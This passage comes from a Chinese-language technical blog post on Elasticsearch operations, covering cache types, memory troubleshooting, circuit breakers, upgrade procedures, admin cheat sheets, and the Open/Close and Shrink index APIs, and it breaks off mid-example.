id="Node-Query-Cache"><a href="#Node-Query-Cache" class="headerlink" title="Node Query Cache"></a>Node Query Cache</h3><ul><li>每一个节点有一个 Node Query 缓存<ul><li>由该节点的所有 Shard 共享，只缓存 Filter Context 相关内容</li><li>Cache 采用 LRU 算法</li></ul></li><li>静态配置，需要设置在每个 Data Node 上<ul><li>Node Level - <code>indices.queries.cache.size: &quot;10%&quot;</code></li><li>Index Level - <code>index.queries.cache.enabled: true</code></li></ul></li></ul><h3 id="Shard-Request-Cache"><a href="#Shard-Request-Cache" class="headerlink" title="Shard Request Cache"></a>Shard Request Cache</h3><ul><li>缓存每个分片上的查询结果<ul><li>只会缓存设置了 size=0 的查询对应的结果。不会缓存 hits。但是会缓存 Aggregations 和 Suggestions</li></ul></li><li>Cache Key<ul><li>LRU 算法，将整个 JSON 查询串作为 Key，与 JSON 对 象的顺序相关</li></ul></li><li>静态配置<ul><li>数据节点：<code>indices.requests.cache.size: &quot;1%&quot;</code></li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.requests.cache.enable"</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会报错</span></span><br><span class="line">GET /my_index/_search?request_cache=true</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"popular_colors"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"colors"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Fielddata-Cache"><a href="#Fielddata-Cache" class="headerlink" title="Fielddata Cache"></a>Fielddata Cache</h3><ul><li>除了 Text 类型，默认都采用 doc_values。节约了内存<ul><li>Aggregation 的 Global ordinals 也保存在 Fielddata cache 中</li></ul></li><li>Text 类型的字段需要打开 Fileddata 才能对其进行聚合和排序<ul><li>Text 经过分词，排序和聚合效果不佳，建议不要轻易使用</li></ul></li><li>配置<ul><li>可以控制 <code>Indices.fielddata.cache.size</code>, 避免产生 GC （默认无限制）</li></ul></li></ul><h3 id="缓存失效"><a href="#缓存失效" class="headerlink" title="缓存失效"></a>缓存失效</h3><ul><li>Node Query Cache<ul><li>保存的是 Segment 级缓存命中的结果。Segment 被合并后，缓存会失效</li></ul></li><li>Shard Request Cache<ul><li>分片 Refresh 时候，Shard Request Cache 会失效。如果 Shard 对应的数据频繁发生变化，该缓存的效率会很差</li></ul></li><li>Fielddata Cache<ul><li>Segment 被合并后，会失效</li></ul></li></ul><h3 id="管理内存的重要性"><a href="#管理内存的重要性" class="headerlink" title="管理内存的重要性"></a>管理内存的重要性</h3><ul><li>Elasticsearch 高效运维依赖于内存的合理分配<ul><li>可用内存一半分配给 JVM，一半留给操作系统，缓存索引文件</li></ul></li><li>内存问题，引发的问题<ul><li>长时间 GC，影响节点，导致集群响应缓慢</li><li>OOM，导致丢节点</li></ul></li></ul><h3 id="诊断内存状况"><a href="#诊断内存状况" class="headerlink" title="诊断内存状况"></a>诊断内存状况</h3><ul><li>查看各个节点的内存状况<ul><li><code>GET _cat/nodes?v</code></li><li><code>GET _nodes/stats/indices?pretty</code></li><li><code>GET _cat/nodes?v&amp;h=name,queryCacheMemory,queryCacheEvictions,requestCacheMemory,reques tCacheHitCount,request_cache.miss_count</code></li><li><code>GET _cat/nodes?h=name,port,segments.memory,segments.index_writer_memory,fielddata.memo ry_size,query_cache.memory_size,request_cache.memory_size&amp;v</code></li></ul></li></ul><h3 id="一些常见的内存问题"><a href="#一些常见的内存问题" class="headerlink" title="一些常见的内存问题"></a>一些常见的内存问题</h3><ul><li><p>Segments 个数过多，导致 full GC</p><ul><li>现象：集群整体响应缓慢，也没有特别多的数据读写。但是发现节点在持续进行 Full GC</li><li>分析：查看 Elasticsearch 的内存使用，发现 segments.memory 占用很大空间</li><li>解决：通过 force merge，把 segments 合并成一个</li><li>建议：对于不在写入和更新的索引，可以将其设置成只读。同时，进行 force merge 操作。如果问题依然存在，则需要考虑扩容。此外，对索引进行 force merge，还可以减少对 global_ordinals 数据结构的构建，减少对 fielddata cache 的开销</li></ul></li><li><p>Field data cache 过大，导致 full GC</p><ul><li>现象：集群整体响应缓慢，也没有特别多的数据读写。但是发现节点在持续进行 Full GC</li><li>分析：查看 Elasticsearch 的内存使用，发现 fielddata.memory.size 占用很大空间。同时，数据不存在写入和更新，也执行过 segments merge。</li><li>解决：将 <code>indices.fielddata.cache.size</code> 设小，重启节点，堆内存恢复正常</li><li>建议：Field data cache 的构建比较重，Elasticsearch 不会主动释放，所以这个值应该设置的保守一些。如果业务上确实有所需要，可以通过增加节点，扩容解决</li></ul></li><li><p>复杂的嵌套聚合，导致集群 full GC</p><ul><li>现象：节点响应缓慢，持续进行 Full GC</li><li>分析：导出 Dump 分析。发现内存中有大量 bucket 对象，查看 日志，发现复杂的嵌套聚合</li><li>解决：优化聚合</li><li>建议：在大量数据集上进行嵌套聚合查询，需要很大的堆内存来完成。如果业务场景确实需要。 则需要增加硬件进行扩展。同时，为了避免这类查询影响整个集群，需要设置 Circuit Breaker 和 search.max_buckets 的数值</li></ul></li></ul><h3 id="Circuit-Breaker"><a href="#Circuit-Breaker" class="headerlink" title="Circuit Breaker"></a>Circuit Breaker</h3><ul><li>包含多种断路器，避免不合理操作引发的 OOM，每个断路器可以指定内存使用的限制<ul><li>Parent circuit breaker：设置所有的熔断器可以使用的内存的总量</li><li>Fielddata circuit breaker：加载 fielddata 所需要的内存</li><li>Request circuit breaker：防止每个请求级数据结构超过一定的内存（例如聚合计算的内存）</li><li>In flight circuit breaker：Request 中的断路器</li><li>Accounting request circuit breaker：请求结束后不能释放的对象所占用的内存</li></ul></li></ul><h3 id="Circuit-Breaker-统计信息"><a href="#Circuit-Breaker-统计信息" class="headerlink" title="Circuit Breaker 统计信息"></a>Circuit Breaker 统计信息</h3><ul><li><code>GET /_nodes/stats/breaker?</code><ul><li>Tripped 大于 0， 说明有过熔断</li><li>Limit size 与 estimated size 约接近，越可能引发熔断</li></ul></li><li>千万不要触发了熔断，就盲目调大参数，有可能会导致集群出问题，也不因该盲目调小，需要进行评估</li><li>建议将集群升级到 7.x，更好的 Circuit Breaker 实现机制<ul><li>增加了 <code>indices.breaker.total.use_real_memory</code> 配置项，可以更加精准的分析内存状况，避免 OOM</li></ul></li></ul><p><img src="/images/big-data/es-07/39.jpg" alt="39"></p><blockquote><p><a href="https://www.elastic.co/blog/improving-node-resiliency-with-the-real-memory-circuit-breaker" target="_blank" rel="noopener">https://www.elastic.co/blog/improving-node-resiliency-with-the-real-memory-circuit-breaker</a></p></blockquote><h2 id="一些运维相关的建议"><a href="#一些运维相关的建议" class="headerlink" title="一些运维相关的建议"></a>一些运维相关的建议</h2><h3 id="集群的生命周期管理"><a href="#集群的生命周期管理" class="headerlink" title="集群的生命周期管理"></a>集群的生命周期管理</h3><ul><li>预上线<ul><li>评估用户的需求及使用场景 / 数据建模 / 容量规划 / 选择合适的部署架构 / 性能测试</li></ul></li><li>上线<ul><li>监控流量 / 定期检查潜在问题 （防患于未然，发现错误的使用方式，及时增加机器）</li><li>对索引进行优化（Index Lifecycle Management），检测是否存在不均衡而导致有部分节点过热</li><li>定期数据备份 / 滚动升级</li></ul></li><li>下架前监控流量，实现 Stage Decommission</li></ul><h3 id="部署的建议"><a href="#部署的建议" class="headerlink" title="部署的建议"></a>部署的建议</h3><ul><li>根据实际场景，选择合适的部署方式，选择合理的硬件配置<ul><li>搜索类</li><li>日志 / 指标</li></ul></li><li>部署要考虑，反亲和性（Anti-Affinity）<ul><li>尽量将机器分散在不同的机架。例如，3 台 Master 节点必须分散在不同的机架上</li><li>善用 Shard Filtering 进行配置</li></ul></li></ul><h3 id="使用要遵循一定的规范"><a href="#使用要遵循一定的规范" class="headerlink" title="使用要遵循一定的规范"></a>使用要遵循一定的规范</h3><ul><li>Mapping<ul><li>生产环境中索引应考虑禁止 Dynamic Index Mapping，避免过多字段导致 Cluster State 占用过多</li><li>禁止索引自动创建的功能，创建时必须提供 Mapping 或通过 Index Template 进行设定</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"action.auto_create_index"</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"action.auto_create_index"</span>: <span class="string">".monitoring-*,logstash-*"</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设置 Slowlogs，发现一些性能不好，甚至是错误的使用 Pattern<ul><li>例如：错误的将网址映射成 keyword，然后用通配符查询。应该使用 Text，结合 URL 分词器</li><li>严禁一切 “*” 开头的通配符查询</li></ul></li></ul><h3 id="对重要的数据进行备份"><a href="#对重要的数据进行备份" class="headerlink" title="对重要的数据进行备份"></a>对重要的数据进行备份</h3><ul><li>集群备份</li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/modules-snapshots.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/modules-snapshots.html</a></li></ul><h3 id="定期更新到新版本"><a href="#定期更新到新版本" class="headerlink" title="定期更新到新版本"></a>定期更新到新版本</h3><ul><li>ES 在新版本中会持续对性能作出优化；提供更多的新功能<ul><li>Circuit breaker 实现的改进</li></ul></li><li>修复一些已知的 bug 和安全隐患</li></ul><h3 id="ES-的版本"><a href="#ES-的版本" class="headerlink" title="ES 的版本"></a>ES 的版本</h3><ul><li>Elasticsearch 的版本格式是： X.Y.Z<ul><li>X: Major</li><li>Y: Minor</li><li>Z: Patch</li></ul></li><li>Elasticsearch 可以使用上一个主版本的索引<ul><li>7.x 可以使用 6.x / 7.x 不支持使用 5.x</li><li>5.x 可以使用 2.x</li></ul></li></ul><h3 id="Rolling-Upgrade-v-s-Full-Cluster-Restart"><a href="#Rolling-Upgrade-v-s-Full-Cluster-Restart" class="headerlink" title="Rolling Upgrade v.s Full Cluster Restart"></a>Rolling Upgrade v.s Full Cluster Restart</h3><ul><li>Rolling Upgrade<ul><li>没有 Downtime</li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/rolling-upgrades.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/rolling-upgrades.html</a></li></ul></li><li>Full Cluster Restart<ul><li>集群在更新期间不可用</li><li>升级更快</li></ul></li></ul><h3 id="Full-Restart-的步骤"><a href="#Full-Restart-的步骤" class="headerlink" title="Full Restart 的步骤"></a>Full Restart 的步骤</h3><ul><li>停止索引数据，同时备份集群</li><li>Disable Shard Allocation （Persistent）</li><li>执行 Synced Flush</li><li>关闭并更新所有节点</li><li>先运行所有 Master 节点 / 再运行其他节点</li><li>等集群变黄后打开 Shard Allocation</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"cluster.routing.allocation.enable"</span>: <span class="string">"primaries"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Force a synced flush</span></span><br><span class="line">POST _flush/synced</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：移动分片"><a href="#运维-Cheat-Sheet：移动分片" class="headerlink" title="运维 Cheat Sheet：移动分片"></a>运维 Cheat Sheet：移动分片</h3><ul><li>从一个节点移动分片到另外一个节点</li><li>使用场景：<ul><li>当一个数据节点上有过多 Hot Shards；可以通过手动分配分片到特定的节点解决</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动一个分片从一个节点到另外一个节点</span></span><br><span class="line">POST _cluster/reroute</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"commands"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"move"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"index_name"</span>,</span><br><span class="line">        <span class="attr">"shard"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"from_node"</span>: <span class="string">"node_name_1"</span>,</span><br><span class="line">        <span class="attr">"to_node"</span>: <span class="string">"node_name_2"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fore the allocation of an unassinged shard with a reason</span></span><br><span class="line">POST _cluster/reroute?explain</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"commands"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"allocate"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"index_name"</span>,</span><br><span class="line">        <span class="attr">"shard"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"node"</span>: <span class="string">"nodename"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：从集群中移除一个节点"><a href="#运维-Cheat-Sheet：从集群中移除一个节点" class="headerlink" title="运维 Cheat Sheet：从集群中移除一个节点"></a>运维 Cheat Sheet：从集群中移除一个节点</h3><ul><li>使用场景：当你想移除一个节点，或者对一个机器进行维护。同时你又不希望导致集群的颜色变黄或者变红</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remove the nodes from cluster </span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;</span><br><span class="line">    <span class="attr">"cluster.routing.allocation.exclude._ip"</span>:<span class="string">"the_IP_of_your_node"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：控制-Allocation-和-Recovery"><a href="#运维-Cheat-Sheet：控制-Allocation-和-Recovery" class="headerlink" title="运维 Cheat Sheet：控制 Allocation 和 Recovery"></a>运维 Cheat Sheet：控制 Allocation 和 Recovery</h3><ul><li>使用场景：控制 Allocation 和 Recovery 的速率</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change the number of moving shards to balance the cluster</span></span><br><span class="line">PUT /_cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;<span class="attr">"cluster.routing.allocation.cluster_concurrent_rebalance"</span>:<span class="number">2</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change the number of shards being recovered simultanceously per node</span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;<span class="attr">"cluster.routing.allocation.node_concurrent_recoveries"</span>:<span class="number">5</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change the recovery speed</span></span><br><span class="line">PUT /_cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;<span class="attr">"indices.recovery.max_bytes_per_sec"</span>: <span class="string">"80mb"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change the number of concurrent streams for a recovery on a single node</span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;<span class="attr">"indices.recovery.concurrent_streams"</span>:<span class="number">6</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：Synced-Flush"><a href="#运维-Cheat-Sheet：Synced-Flush" class="headerlink" title="运维 Cheat Sheet：Synced Flush"></a>运维 Cheat Sheet：Synced Flush</h3><ul><li>使用场景：需要重启一个节点。<ul><li>通过 synced flush，可以在索引上放置一个 sync ID。这样可以提供这些分片的 Recovery 的时间</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Force a synced flush</span></span><br><span class="line">POST _flush/synced</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：清空节点上的缓存"><a href="#运维-Cheat-Sheet：清空节点上的缓存" class="headerlink" title="运维 Cheat Sheet：清空节点上的缓存"></a>运维 Cheat Sheet：清空节点上的缓存</h3><ul><li>使用场景：节点上出现了高内存占用。可以执行清除缓存的操作。这个操作会影响集群的性能，但是会避免你的集群出现 OOM 的问题</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Clear the cache on a node</span></span><br><span class="line">POST _cache/clear</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：清控制搜索的队列"><a href="#运维-Cheat-Sheet：清控制搜索的队列" class="headerlink" title="运维 Cheat Sheet：清控制搜索的队列"></a>运维 Cheat Sheet：清控制搜索的队列</h3><ul><li>使用场景：当搜索的响应时间过长，看到有 “reject” 指标的增加，都可以适当增加该数值</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Change the sinze of the search queue</span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"transient"</span>: &#123;</span><br><span class="line">    <span class="attr">"threadpool.search.queue_size"</span>: <span class="number">2000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运维-Cheat-Sheet：设置-Circuit-Breaker"><a href="#运维-Cheat-Sheet：设置-Circuit-Breaker" class="headerlink" title="运维 Cheat Sheet：设置 Circuit Breaker"></a>运维 Cheat Sheet：设置 Circuit Breaker</h3><ul><li>使用场景：设置各类 Circuit Breaker。避免 OOM 的发生</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Adjust the circuit breakers</span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"indices.breaker.total.limit"</span>:<span class="string">"40%"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运维建议"><a href="#运维建议" class="headerlink" title="运维建议"></a>运维建议</h3><ul><li>了解用户场景，选择合适部署</li><li>定期检查，发现潜在问题</li><li>对重要的数据进行备份</li><li>保持版本升级</li></ul><h2 id="使用-Shrink-与-RolloverAPI-有效的管理索引"><a href="#使用-Shrink-与-RolloverAPI-有效的管理索引" class="headerlink" title="使用 Shrink 与 RolloverAPI 有效的管理索引"></a>使用 Shrink 与 RolloverAPI 有效的管理索引</h2><ul><li>Open / Close Index∶ 索引关闭后无法进行读写，但是索引数据不会被删除</li><li>Shrink Index∶ 可以将索引的主分片数收缩到较小的值</li><li>Split Index∶ 可以扩大主分片个数</li><li>Rollover Index∶ 类似 Log4J 记录日志的方式，索引尺寸或者时间超过一定值后，创建新的</li><li>Rollup Index∶ 对数据进行处理后，重新写入，减少数据量</li></ul><h3 id="Open-Close-Index-API"><a href="#Open-Close-Index-API" class="headerlink" title="Open / Close Index API"></a>Open / Close Index API</h3><ul><li>索引关闭后，对集群的相关开销基本降低为 0</li><li>但是无法被读取和搜索</li><li>当需要的时候，可以重新打开</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DELETE test</span><br><span class="line">PUT test/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭索引</span></span><br><span class="line">POST /test/_close</span><br><span class="line"><span class="comment">// 查看索引是否存在</span></span><br><span class="line">HEAD test</span><br><span class="line"><span class="comment">// 无法查询</span></span><br><span class="line">POST test/_count</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开索引</span></span><br><span class="line">POST /test/_open</span><br><span class="line">POST test/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST test/_count</span><br></pre></td></tr></table></figure><h3 id="Shrink-API"><a href="#Shrink-API" class="headerlink" title="Shrink API"></a>Shrink API</h3><ul><li>ES 5.x 后推出的一个新功能，使用场景<ul><li>索引保存的数据量比较小，需要重新设定主分片数</li><li>索引从 Hot 移动到 Warm 后，需要降低主分片数</li></ul></li><li>会使用和源索引<strong>相同的配置</strong>创建一个新的索引，仅仅<strong>降低主分片数</strong><ul><li>源分片数必须是目标分片数的倍数。如果源分片数是素数，目标分片数只能为 1</li><li>如果文件系统支持硬链接，会将 Segments 硬连接到目标索引，所以性能好</li></ul></li><li>完成后，可以删除源索引</li></ul><p><img src="/images/big-data/es-07/40.jpg" alt="40"></p><ul><li>分片必须只读</li><li>所有的分片必须在同一个节点上</li><li>集群健康状态为 Green</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在一个 hot-warm-cold的集群上进行测试</span></span><br><span class="line">GET _cat/nodes</span><br><span class="line">GET _cat/nodeattrs</span><br><span class="line"></span><br><span class="line">DELETE my_source_index</span><br><span class="line">DELETE my_target_index</span><br><span class="line">PUT my_source_index</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"settings"</span>: &#123;</span><br><span class="line">   <span class="attr">"number_of_shards"</span>: <span class="number">4</span>,</span><br><span class="line">   <span class="attr">"number_of_replicas"</span>: <span class="number">0</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_source_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards/my_source_index</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分片数3，会失败</span></span><br><span class="line">POST my_source_index/_shrink/my_target_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_replicas"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">"index.codec"</span>: <span class="string">"best_compression"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"my_search_indices"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错，因为没有置成 readonly</span></span><br><span class="line">POST my_source_index/_shrink/my_target_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_replicas"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"index.codec"</span>: <span class="string">"best_compression"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"my_search_indices"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 my_source_index 设置为只读</span></span><br><span 